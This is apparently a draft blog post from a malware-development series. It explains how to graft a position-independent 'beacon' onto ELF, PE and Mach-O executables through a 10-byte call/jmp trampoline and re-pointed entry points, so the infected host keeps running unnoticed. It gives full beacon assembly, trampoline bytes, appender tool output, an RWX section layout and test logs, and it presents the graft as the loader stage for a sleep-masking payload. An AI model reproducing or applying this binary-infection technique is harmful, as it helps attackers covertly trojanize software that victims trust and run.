---
title: Grafting a beacon onto a live process
description: A 10-byte call/jmp trampoline and three appenders (ELF / PE32+ / Mach-O) graft a PIC beacon onto a live binary's entry point — the beacon writes its token, restores all 15 GPRs, and the host keeps running, exit code and all.
publishedAt: 2026-09-04
updatedAt: null
draft: true
tags: [reverse-engineering, malware, assembly]
cover: null
artifacts: []
---

The whole deployment lives in ten bytes:

```
E8 05 00 00 00 E9 D6 B0 FF FF
```

That is the entire graft. `E8 05 00 00 00` is `call +5` — a near call to the instruction ten bytes later. `E9 D6 B0 FF FF` is `jmp -0x4F2A`. Put the ten bytes at a fresh page above everything the host image already owns, append the beacon blob right behind them, re-point the entry point at the `call`, and the loader does the rest: it enters the trampoline, the trampoline calls the beacon, the beacon does its work and `ret`s — and the `ret` lands on `V+5`, the `E9`, which jumps to the **original** entry point. The host then runs exactly as if nothing happened, having already paid for the malware.

The last four bytes are the only per-victim bytes in the whole scheme: `D6 B0 FF FF` is the signed displacement that puts the `jmp` on the host's old entry. On a gcc-built PIE host that is `0xFFFFB0D6` (`-0x4F2A`): the region sits at vaddr `0x6000`, so `0x600A - 0x4F2A = 0x10E0`, the original entry. On a PE and a Mach-O where the blob lands at offset `0x2000` from the image base and the host entered at `0x1000`, the same arithmetic gives `E9 F6 EF FF FF` (`-0x100A`) for both. Three formats, one trampoline, the displacement is the only thing the appender has to compute.

## A function, not a program

The beacon is the other half of the contract, and it is the part that makes this a graft instead of a clobber. The deployable payloads from the previous posts are programs: they do their work and `exit`. A grafted blob must instead behave as a *proper function*, because it is called from the middle of the process's life:

```
; beacon_linux.asm — x86-64, PIC, no imports, no libc
beacon_linux:
    push rax
    push rcx
    push rdx
    push rbx
    push rsi
    push rdi
    push rbp
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15

    lea  rsi, [rel msg]    ; RIP-relative -> PIC from any base
    mov  rdi, 1            ; fd = stdout
    mov  rdx, msglen
    mov  rax, 1            ; SYS_write
    syscall

    pop  r15
    pop  r14
    pop  r13
    pop  r12
    pop  r11
    pop  r10
    pop  r9
    pop  r8
    pop  rbp
    pop  rdi
    pop  rsi
    pop  rbx
    pop  rdx
    pop  rcx
    pop  rax
    ret
```

Fifteen pushes, fifteen pops, `ret`. The reason every GPR has to survive is that at entry the kernel has handed the image its startup state in registers — on Linux `RDI=argc`, `SI=argv`, `DX=envp`, `CX=auxv` — and clobbering any of them before the host's `_start` runs breaks the process in ways that are fun to debug for exactly one hour. The `ret` is what the ten-byte trampoline is built for: the beacon does not know where to come back to, and it does not need to. The trampoline encodes the return address; the beacon just has to be a function.

The disassembly head is the same across all three — `50 51 52 53 56 57 55 41 50 ...` — and the payloads differ only in the middle. Full disassemblies are in [`media/`](media/). Sizes: the Linux and macOS beacons are **122 bytes** each (the syscalls differ — Linux `rax=1`, XNU `rax=0x02000000|1` — but the shape is identical); the Windows beacon is **1560 bytes** because it carries the PEB walk and export parse from the previous post instead of a hard-coded `syscall`.

## Three appenders, one contract

The contract the appenders must honor: every original byte untouched; the blob appended at a fresh, page-aligned address above all existing mappings; the entry point re-pointed at the trampoline; and the image still loadable by the real loader. Each format makes that a different problem.

### ELF: the phdr table has to move

A gcc `-O2` PIE is packed — the program header table sits between the ELF header and the first load, and there is no room to grow it in place. The fix is to relocate the *entire table* into the appended region and point the kernel at it:

```
$ micromamba run -n mdev python tools/append_elf.py host_pie build/beacon_linux.bin host_pie.coupled
appended: region file 0x4000 -> vaddr 0x6000 (tramp 10 B, blob 122 B, phdrs 784 B)
segment:  new PT_LOAD r-x file 0x4000 -> vaddr 0x6000, filesz 0x394
entry:    0x10e0 -> 0x6000 (call blob, jmp old entry)
```

The appended region is `[trampoline:10][blob:122][phdrs:784]`. The `784` is `14 × 56`: the host's thirteen original phdrs plus the new `PT_LOAD`, copied verbatim except the `PT_PHDR` entry, whose `p_offset`/`p_vaddr`/`p_paddr` are re-pointed at the copy. Then three in-place patches — `e_entry → 0x6000`, `e_phoff → F+table`, `e_phnum 13 → 14` — and a new `PT_LOAD` (R|X) covering the whole region. The kernel reads phdrs straight from `e_phoff` and glibc's `ld.so` walks from `PT_PHDR`, so relocating the table is legal and needs zero room inside the original image — which is exactly what makes this work on dense, fully-packed gcc outputs.

### PE: a new section, entry re-pointed

```
# host_win.coupled.exe — PE section table (entry RVA 0x2000)

  .text   VA 0x1000  vsize 0x03bb  raw 0x0200  rawsize 0x0400  chars 0xe0000020
  .bcon   VA 0x2000  vsize 0x0622  raw 0x0600  rawsize 0x0800  chars 0xe0000020
```

The appender appends a second section, `.bcon`, with `Characteristics 0xE0000020` — `CNT_CODE | MEM_READ | MEM_WRITE | MEM_EXECUTE`: readable, writable, executable code. The blob is const, so the `MEM_WRITE` bit is the appender being conservative about what the loader may touch, not a requirement of the stub. Its `VirtualSize` is `0x622` = `10 + 1560`; file alignment rounds the raw data to `0x800`. `OptionalHeader.AddressOfEntryPoint` moves from `0x1000` to `0x2000`. The original `.text` raw data is byte-identical to the host's — the test asserts it.

### Mach-O: one segment, two sections, `LC_MAIN` re-pointed

```
appended: __bcon vaddr 0x100002000, file 0x2000 (stub 10 B, blob 122 B, section 132 B)
entry:    0x100001000 -> 0x100002000 (call blob, jmp old entry)
segment:  nsects 1 -> 2, vmsize 0x2000 -> 0x3000
```

There is no PE-style section table to extend; the appender grows the single `__TEXT` `LC_SEGMENT_64`'s `nsects` from 1 to 2 (its `cmdsize` accordingly, `+80` for one section entry), appends a `__bcon` section entry at the end of the segment's section array, and re-points `LC_MAIN.entryoff` — an offset from the segment's `vmaddr`, not an absolute address, which is what makes the +slide test meaningful.

## Proving it on three runtimes

The appender's output is only as good as a loader that will map it. So each coupled image is entered the way its platform would, with the beacon's work asserted *before* the host's, byte for byte:

**Linux, on real metal.** The test builds a real gcc host (prints `host alive`, returns 42) as both a PIE and a `-no-pie -static`, couples each, and executes it. PASS is byte-exact: the beacon token on fd 1 *first*, then the host's line, then the host's original exit status.

```
  ok  pie: beacon + host output, byte-exact
  ok  pie: host exit status preserved (42)
  ok  pristine host still rc=42
  ok  no-pie: beacon + host output, byte-exact
  ok  no-pie: host exit status preserved (42)
  ok  pristine host still rc=42
  ok  coupled: PT_LOAD count +1
  info coupled entry: 0x6000
PASS (linux host coupling: beacon fired, host ran, exit code preserved, PIE + no-pie)
```

That is the layer that matters most: a kernel, a dynamic linker, and a glibc that never knew they were being grafted onto. The coupled PIE's `PT_LOAD` count went up by exactly one and its entry moved to the trampoline.

**Windows, under Unicorn.** No Windows here, so the coupled PE is loaded into [Unicorn](https://github.com/unicorn-engine/unicorn) at its `ImageBase` with a hand-built PEB/`ntdll` (the same fixture as the sleep-masking post) and entered the way the loader would. The run happens twice — once with the real syscall numbers (`NtWriteFile=0x17`, `NtTerminateProcess=0x0B`) and once with decoys baked into the fake export thunks (`0x5C`/`0x99`) — to prove the number is read out of the thunk prologue, not hard-coded:

```
appended: .bcon RVA 0x2000, raw 0x600 (stub 10 B, blob 1560 B, section 2048 B)
entry:    RVA 0x1000 -> 0x2000 (call blob, jmp old entry)
image:    2 sections, headers 512 B, SizeOfImage 0x3000
static:   .bcon RWX at new entry; stub=call+jmp; beacon byte-identical; .text untouched; reader ok
[real] writes=['sleepmask: coupled | windows x86-64 | host continues\n', 'sleepmask: coupled | windows x86-64 | host continues\n', 'host alive\n'] created=[('\\sleepmask_beacon.txt', 0)] exit=42 r15=ok
[decoy] writes=['sleepmask: coupled | windows x86-64 | host continues\n', 'sleepmask: coupled | windows x86-64 | host continues\n', 'host alive\n'] created=[('\\sleepmask_beacon.txt', 0)] exit=42 r15=ok
PASS (windows host coupling: beacon fired first -> stdout AND \sleepmask_beacon.txt; host ran, exit 42 + r15 preserved; real + decoy nr)
```

The `created=` column is the oracle's file-artifact check: the Windows beacon proves the same export walk can resolve *file* syscalls, too — best-effort `NtCreateFile` + `NtWriteFile` + `NtClose` on `sleepmask_beacon.txt` in the working directory — which is why the token appears twice in `writes`: once on stdout, once in the file. Before entry the test parks a sentinel in `R15` (`0x2222222222222222`). It has to survive: the beacon saves every GPR and the host never touches that register. There is a subtlety worth naming — `RBX` is **not** a valid sentinel on this host, because the Windows host uses it as a scratch register and clobbers it on purpose. The macOS host uses neither, so its test asserts on both.

**macOS, under Unicorn, at two slides.** XNU x86-64 syscalls are class-tagged (`rax = 0x02000000 | nr`), so `write` is `0x02000000` and `exit` is `0x02000001`. The coupled image is loaded at its nominal `__TEXT` base and then again at `base + 0x1000` — the ASLR slide — to prove the stub and beacon are genuinely PIC:

```
appended: __bcon vaddr 0x100002000, file 0x2000 (stub 10 B, blob 122 B, section 132 B)
entry:    0x100001000 -> 0x100002000 (call blob, jmp old entry)
segment:  nsects 1 -> 2, vmsize 0x2000 -> 0x3000
static:   __bcon at new entry; stub=call+jmp; beacon byte-identical; __text untouched; LC_MAIN re-pointed
walker:   independent command walk agrees (2 cmds, sizes, nsects)
[base]  writes=['sleepmask: coupled | macos x86-64 | host continues\n', 'host alive\n'] exit=42 rbx=ok r15=ok
[slide] writes=['sleepmask: coupled | macos x86-64 | host continues\n', 'host alive\n'] exit=42 rbx=ok r15=ok
PASS (macos host coupling: beacon fired first, host ran, exit 42 preserved, GPRs intact; base + slide)
```

## What this proves, and what it doesn't

It proves the deployment: all three appenders produce an image the real loader will map, the trampoline hands control to the beacon without the beacon knowing where it lives, the beacon's register hygiene is real (the sentinels survive a full host run), the host is byte-identical and keeps its exit code, and on the two emulated targets the PIC claim holds under a non-zero slide. The Linux layer is the one that ran on a real kernel.

It does *not* prove stealth. The RWX `.bcon` section, the relocated phdr table, the moved `e_entry` — each is a bright flag to anything that compares the image against its on-disk hash or walks the section table looking for writable-executable. This graft is the *loader step* of the family: the beacon's job is to hand off to the sleep-masking payload from the previous post, and the beacon itself is designed to be the thing that gets found last. What it also doesn't prove is that a real Windows or macOS loader will be as forgiving as Unicorn about a hand-grown section; the ELF layer is the only one that has met a genuine loader and survived.

## Reproduce

```
bash build.sh
micromamba run -n mdev python tests/test_append_macos.py
micromamba run -n mdev python tests/test_append_windows.py
bash tests/test_append_linux.sh
```

Expect the three `PASS (...)` blocks above. All three layers are wired into `test_all.sh` as the coupled layers; it exits 0 only if all eleven pass. The trampoline hex dumps, section tables, and beacon disassemblies are in [`media/`](media/).

## Sources

- [ELF format — man7.org](https://man7.org/linux/man-pages/man5/elf.5.html)
- [PE file format — Microsoft docs](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [Mach-O — Wikipedia](https://en.wikipedia.org/wiki/Mach-O)
- [OS X ABI Mach-O File Format Reference (mirror)](https://github.com/aidansteele/osx-abi-macho-file-format-reference)
- [Parsing Mach-O files — Low Level Bits](https://lowlevelbits.org/parsing-mach-o-files/)
- [macOS 64-bit system call table — Stack Overflow](https://stackoverflow.com/questions/48845697/macos-64-bit-system-call-table)
- [syscalls.master — apple/darwin-xnu](https://github.com/apple/darwin-xnu/blob/main/bsd/kern/syscalls.master)
- [Unicorn Engine](https://github.com/unicorn-engine/unicorn)
- [Capstone Engine](https://github.com/capstone-engine/capstone)
- [NASM](https://nasm.sourceforge.io/)
